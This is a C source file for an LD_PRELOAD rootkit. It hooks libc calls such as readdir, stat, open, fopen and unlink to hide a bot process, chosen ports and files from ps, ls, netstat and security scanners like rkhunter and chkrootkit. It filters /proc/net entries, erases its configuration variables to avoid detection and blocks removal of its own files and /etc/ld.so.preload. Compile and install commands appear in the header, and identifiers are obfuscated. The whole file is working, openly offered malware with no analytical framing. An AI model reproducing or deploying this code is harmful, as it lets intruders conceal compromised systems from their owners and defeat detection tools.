/* ======================================================================
   LD_PRELOAD ROOTKIT
   Hooks libc functions to hide bot process, files, and network connections
   from userland tools (ps, ls, top, netstat, ss, cat /proc/net/tcp).

   Compile: gcc -shared -fPIC -o libproc.so rootkit.c -ldl -D_GNU_SOURCE
   Install: echo /path/to/libproc.so > /etc/ld.so.preload

   Configuration is via environment variables set before loading:
     RK_PID    — PID to hide (set by bot at fork time)
     RK_PORTS  — comma-separated ports to hide (e.g., "42780,1080")
     RK_FILES  — comma-separated filenames to hide (e.g., "libproc.so,.d")
   ====================================================================== */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>

/* Userland tools we hide from. Cron, bash, systemd, init, sh see everything. */
static const char *_Jc7qB8S[] = {
    "ls", "dir", "find", "locate", "tree", "du", "stat", "file",
    "ps", "top", "htop", "atop", "pgrep", "pidof", "pstree",
    "netstat", "ss", "lsof", "fuser",
    "cat", "head", "tail", "less", "more", "strings", "xxd", "hexdump",
    "strace", "ltrace", "gdb", "objdump", "readelf", "nm",
    "md5sum", "sha1sum", "sha256sum", "sha512sum",
    "rkhunter", "chkrootkit", "clamav", "clamscan", "lynis",
    "tripwire", "aide", "ossec", "maldet", "lmd",
    "rm", "unlink", "shred", "wipe",
    "cp", "mv", "install",
    NULL
};

/* Cached config — parsed once from env vars */
static int _XP2ug5V = -1;
static char _Ta4Rp7T[16] = {0};
static char *_ic2nq3j[16] = {NULL};
static int _ss8Ei3r = 0;
static char *_ZL6pz8m[32] = {NULL};
static int _Re7Bi7c = 0;
static int _Pp5ua5w = 0;

/* Check if the calling process is a tool we hide from.
 * Uses real readlink (not our hook) to avoid infinite recursion.
 * Cached per-process (only changes on exec). */
static int _nZ6JU3x(void) {
    static int cached = -1;
    ssize_t (*real_readlink)(const char *, char *, size_t);
    char buf[256], *base;
    ssize_t n;
    int i;

    if (cached >= 0) return cached;

    real_readlink = dlsym(RTLD_NEXT, "readlink");
    if (!real_readlink) { cached = 0; return 0; }

    n = real_readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (n <= 0) { cached = 0; return 0; }
    buf[n] = '\0';

    /* Strip " (deleted)" suffix if present */
    if (n > 10 && strcmp(buf + n - 10, " (deleted)") == 0)
        buf[n - 10] = '\0';

    base = strrchr(buf, '/');
    base = base ? base + 1 : buf;

    for (i = 0; _Jc7qB8S[i]; i++) {
        if (strcmp(base, _Jc7qB8S[i]) == 0) {
            cached = 1;
            return 1;
        }
    }
    cached = 0;
    return 0;
}

static void _Rp7fk5P(void) {
    char *val, *tok, *saveptr;
    if (_Pp5ua5w) return;
    _Pp5ua5w = 1;

    /* PID to hide */
    val = getenv("RK_PID");
    if (val && val[0]) {
        _XP2ug5V = atoi(val);
        snprintf(_Ta4Rp7T, sizeof(_Ta4Rp7T), "%d", _XP2ug5V);
    } else {
        /* Fallback: hide parent PID (the bot that loaded us) */
        _XP2ug5V = getppid();
        snprintf(_Ta4Rp7T, sizeof(_Ta4Rp7T), "%d", _XP2ug5V);
    }

    /* Ports to hide from /proc/net/tcp */
    val = getenv("RK_PORTS");
    if (val && val[0]) {
        char *copy = strdup(val);
        tok = strtok_r(copy, ",", &saveptr);
        while (tok && _ss8Ei3r < 16) {
            _ic2nq3j[_ss8Ei3r++] = strdup(tok);
            tok = strtok_r(NULL, ",", &saveptr);
        }
        free(copy);
    }

    /* Filenames to hide */
    val = getenv("RK_FILES");
    if (val && val[0]) {
        char *copy = strdup(val);
        tok = strtok_r(copy, ",", &saveptr);
        while (tok && _Re7Bi7c < 32) {
            _ZL6pz8m[_Re7Bi7c++] = strdup(tok);
            tok = strtok_r(NULL, ",", &saveptr);
        }
        free(copy);
    }

    /* Clean env to avoid detection */
    unsetenv("RK_PID");
    unsetenv("RK_PORTS");
    unsetenv("RK_FILES");
}

/* Check if a filename should be hidden */
static int _Vd3Kv8p(const char *name) {
    int i;
    if (!name) return 0;
    for (i = 0; i < _Re7Bi7c; i++) {
        if (strcmp(name, _ZL6pz8m[i]) == 0) return 1;
    }
    return 0;
}

/* Check if a path belongs to our hidden PID in /proc */
static int _JN6YE6p(const char *path) {
    char prefix[32];
    if (!path || _XP2ug5V <= 0) return 0;
    snprintf(prefix, sizeof(prefix), "/proc/%d", _XP2ug5V);
    return (strncmp(path, prefix, strlen(prefix)) == 0);
}

/* Check if a /proc/net/tcp line contains a hidden port.
 * Format: "  sl  local_address rem_address ..."
 * local_address is hex IP:PORT where PORT is in hex. */
static int _sN8Vx7D(const char *line) {
    const char *colon;
    unsigned int port;
    int i;
    if (_ss8Ei3r == 0) return 0;

    /* Find local_address field (after whitespace + index + colon) */
    colon = strchr(line, ':');
    if (!colon) return 0;
    /* Skip past the index "sl:" part — find next colon which is in the IP:PORT */
    colon = strchr(colon + 1, ':');
    if (!colon) return 0;

    /* Parse hex port after the colon */
    if (sscanf(colon + 1, "%X", &port) != 1) return 0;

    for (i = 0; i < _ss8Ei3r; i++) {
        if ((int)port == atoi(_ic2nq3j[i])) return 1;
    }
    return 0;
}

/* ======================================================================
   HOOKED FUNCTIONS
   ====================================================================== */

/* readdir — hide PID entries from /proc and hidden files from any dir */
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*real_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;

    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_readdir(dirp);

    while ((entry = real_readdir(dirp)) != NULL) {
        /* Hide our PID from /proc listing */
        if (_XP2ug5V > 0 && strcmp(entry->d_name, _Ta4Rp7T) == 0)
            continue;

        /* Hide configured filenames */
        if (_Vd3Kv8p(entry->d_name))
            continue;

        return entry;
    }
    return NULL;
}

/* readdir64 — same for 64-bit variant */
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*real_readdir64)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;

    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_readdir64(dirp);

    while ((entry = real_readdir64(dirp)) != NULL) {
        if (_XP2ug5V > 0 && strcmp(entry->d_name, _Ta4Rp7T) == 0)
            continue;
        if (_Vd3Kv8p(entry->d_name))
            continue;
        return entry;
    }
    return NULL;
}

/* stat — hide hidden PID paths and hidden files */
int stat(const char *pathname, struct stat *statbuf) {
    int (*real_stat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_stat(pathname, statbuf);

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }
    /* Check if basename matches hidden files */
    {
        const char *base = strrchr(pathname, '/');
        if (base) base++; else base = pathname;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real_stat(pathname, statbuf);
}

/* lstat — same as stat */
int lstat(const char *pathname, struct stat *statbuf) {
    int (*real_lstat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "lstat");
    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_lstat(pathname, statbuf);

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }
    {
        const char *base = strrchr(pathname, '/');
        if (base) base++; else base = pathname;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real_lstat(pathname, statbuf);
}

/* open — intercept /proc/net/tcp to filter hidden ports */
int open(const char *pathname, int flags, ...) {
    int (*real_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    int fd;
    _Rp7fk5P();

    if (!_nZ6JU3x()) {
        if (flags & O_CREAT) {
            va_list ap; mode_t mode;
            va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
            return real_open(pathname, flags, mode);
        }
        return real_open(pathname, flags);
    }

    /* Block hidden callers from opening protected files */
    if (pathname) {
        const char *base = strrchr(pathname, '/');
        base = base ? base + 1 : pathname;
        if (_Vd3Kv8p(base)) { errno = ENOENT; return -1; }
    }

    /* For /proc/net/tcp[6] — create a filtered temp file */
    if (_ss8Ei3r > 0 && pathname &&
        (strcmp(pathname, "/proc/net/tcp") == 0 ||
         strcmp(pathname, "/proc/net/tcp6") == 0 ||
         strcmp(pathname, "/proc/net/udp") == 0 ||
         strcmp(pathname, "/proc/net/udp6") == 0)) {

        /* Read original, filter lines, return fd to filtered version */
        fd = real_open(pathname, O_RDONLY);
        if (fd < 0) return fd;

        /* Read entire file into buffer */
        {
            char buf[32768];
            char filtered[32768];
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n <= 0) return real_open("/dev/null", O_RDONLY);

            buf[n] = '\0';
            filtered[0] = '\0';

            /* Copy lines that don't contain hidden ports */
            {
                char *line = buf;
                int flen = 0;
                while (line && *line) {
                    char *nl = strchr(line, '\n');
                    int line_len;
                    if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                    else line_len = (int)strlen(line);

                    if (!_sN8Vx7D(line)) {
                        if (flen + line_len + 2 < (int)sizeof(filtered)) {
                            memcpy(filtered + flen, line, (size_t)line_len);
                            flen += line_len;
                            filtered[flen++] = '\n';
                        }
                    }

                    if (nl) { *nl = '\n'; line = nl + 1; }
                    else break;
                }
                filtered[flen] = '\0';

                /* Write to a memfd or pipe */
                {
                    int pipefd[2];
                    if (pipe(pipefd) < 0) return real_open("/dev/null", O_RDONLY);
                    write(pipefd[1], filtered, (size_t)flen);
                    close(pipefd[1]);
                    return pipefd[0];
                }
            }
        }
    }

    /* Hide /proc/<pid> paths */
    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return real_open(pathname, flags);
}

/* openat — modern glibc uses this instead of open() */
int openat(int dirfd, const char *pathname, int flags, ...) {
    int (*real_openat)(int, const char *, int, ...) = dlsym(RTLD_NEXT, "openat");
    _Rp7fk5P();

    if (!_nZ6JU3x()) {
        if (flags & O_CREAT) {
            va_list ap; mode_t mode;
            va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
            return real_openat(dirfd, pathname, flags, mode);
        }
        return real_openat(dirfd, pathname, flags);
    }

    /* Block hidden callers from opening protected files */
    if (pathname) {
        const char *base = strrchr(pathname, '/');
        base = base ? base + 1 : pathname;
        if (_Vd3Kv8p(base)) { errno = ENOENT; return -1; }
    }

    /* Filter /proc/net/tcp etc */
    if (_ss8Ei3r > 0 && pathname &&
        (strcmp(pathname, "/proc/net/tcp") == 0 ||
         strcmp(pathname, "/proc/net/tcp6") == 0 ||
         strcmp(pathname, "/proc/net/udp") == 0 ||
         strcmp(pathname, "/proc/net/udp6") == 0)) {

        int fd = real_openat(dirfd, pathname, O_RDONLY);
        if (fd < 0) return fd;

        {
            char buf[32768];
            char filtered[32768];
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n <= 0) return real_openat(dirfd, "/dev/null", O_RDONLY);

            buf[n] = '\0';
            {
                char *line = buf;
                int flen = 0;
                while (line && *line) {
                    char *nl = strchr(line, '\n');
                    int line_len;
                    if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                    else line_len = (int)strlen(line);

                    if (!_sN8Vx7D(line)) {
                        if (flen + line_len + 2 < (int)sizeof(filtered)) {
                            memcpy(filtered + flen, line, (size_t)line_len);
                            flen += line_len;
                            filtered[flen++] = '\n';
                        }
                    }
                    if (nl) { *nl = '\n'; line = nl + 1; }
                    else break;
                }
                {
                    int pipefd[2];
                    if (pipe(pipefd) < 0) return real_openat(dirfd, "/dev/null", O_RDONLY);
                    write(pipefd[1], filtered, (size_t)flen);
                    close(pipefd[1]);
                    return pipefd[0];
                }
            }
        }
    }

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return real_openat(dirfd, pathname, flags);
}

/* fopen — intercept /proc/net/tcp reads (glibc internal open bypasses PLT) */
FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*real_fopen)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen");
    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_fopen(pathname, mode);

    /* Block hidden callers from opening protected files */
    if (pathname) {
        const char *base = strrchr(pathname, '/');
        base = base ? base + 1 : pathname;
        if (_Vd3Kv8p(base)) { errno = ENOENT; return NULL; }
    }

    if (_ss8Ei3r > 0 && pathname &&
        (strcmp(pathname, "/proc/net/tcp") == 0 ||
         strcmp(pathname, "/proc/net/tcp6") == 0 ||
         strcmp(pathname, "/proc/net/udp") == 0 ||
         strcmp(pathname, "/proc/net/udp6") == 0)) {

        FILE *orig = real_fopen(pathname, "r");
        if (!orig) return orig;

        /* Read, filter, write to temp file */
        {
            char buf[32768];
            char filtered[32768];
            size_t n = fread(buf, 1, sizeof(buf) - 1, orig);
            fclose(orig);
            if (n == 0) return real_fopen("/dev/null", mode);

            buf[n] = '\0';
            {
                char *line = buf;
                int flen = 0;
                while (line && *line) {
                    char *nl = strchr(line, '\n');
                    int line_len;
                    if (nl) { *nl = '\0'; line_len = (int)(nl - line); }
                    else line_len = (int)strlen(line);

                    if (!_sN8Vx7D(line)) {
                        if (flen + line_len + 2 < (int)sizeof(filtered)) {
                            memcpy(filtered + flen, line, (size_t)line_len);
                            flen += line_len;
                            filtered[flen++] = '\n';
                        }
                    }
                    if (nl) { *nl = '\n'; line = nl + 1; }
                    else break;
                }
                {
                    FILE *tmp = tmpfile();
                    if (!tmp) return real_fopen("/dev/null", mode);
                    fwrite(filtered, 1, (size_t)flen, tmp);
                    rewind(tmp);
                    return tmp;
                }
            }
        }
    }

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return NULL;
    }

    return real_fopen(pathname, mode);
}

/* fopen64 — same hook for 64-bit variant */
FILE *fopen64(const char *pathname, const char *mode) {
    FILE *(*real_fopen64)(const char *, const char *) = dlsym(RTLD_NEXT, "fopen64");
    /* Delegate to our fopen hook which handles filtering */
    FILE *(*our_fopen)(const char *, const char *) = fopen;
    (void)real_fopen64;
    return our_fopen(pathname, mode);
}

/* access — hide hidden PID paths */
int access(const char *pathname, int mode) {
    int (*real_access)(const char *, int) = dlsym(RTLD_NEXT, "access");
    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_access(pathname, mode);

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }
    {
        const char *base = strrchr(pathname, '/');
        if (base) base++; else base = pathname;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
    }
    return real_access(pathname, mode);
}

/* readlink — hide /proc/<pid>/exe */
ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    ssize_t (*real_readlink)(const char *, char *, size_t) = dlsym(RTLD_NEXT, "readlink");
    _Rp7fk5P();
    if (!_nZ6JU3x()) return real_readlink(pathname, buf, bufsiz);

    if (_JN6YE6p(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_readlink(pathname, buf, bufsiz);
}

/* unlink — block deletion of protected files (bot binary, rootkit .so, ld.so.preload) */
int unlink(const char *pathname) {
    int (*real_unlink)(const char *) = dlsym(RTLD_NEXT, "unlink");
    const char *base;
    _Rp7fk5P();

    if (pathname) {
        base = strrchr(pathname, '/');
        base = base ? base + 1 : pathname;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
        /* Protect ld.so.preload from removal */
        if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
            errno = EACCES;
            return -1;
        }
    }
    return real_unlink(pathname);
}

/* unlinkat — modern variant used by rm, glibc wrappers */
int unlinkat(int dirfd, const char *pathname, int flags) {
    int (*real_unlinkat)(int, const char *, int) = dlsym(RTLD_NEXT, "unlinkat");
    const char *base;
    _Rp7fk5P();

    if (pathname) {
        base = strrchr(pathname, '/');
        base = base ? base + 1 : pathname;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
        if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
            errno = EACCES;
            return -1;
        }
    }
    return real_unlinkat(dirfd, pathname, flags);
}

/* rename — block moving/renaming of protected files */
int rename(const char *oldpath, const char *newpath) {
    int (*real_rename)(const char *, const char *) = dlsym(RTLD_NEXT, "rename");
    const char *base;
    _Rp7fk5P();

    if (oldpath) {
        base = strrchr(oldpath, '/');
        base = base ? base + 1 : oldpath;
        if (_Vd3Kv8p(base)) {
            errno = ENOENT;
            return -1;
        }
        if (strcmp(oldpath, "/etc/ld.so.preload") == 0) {
            errno = EACCES;
            return -1;
        }
    }
    return real_rename(oldpath, newpath);
}
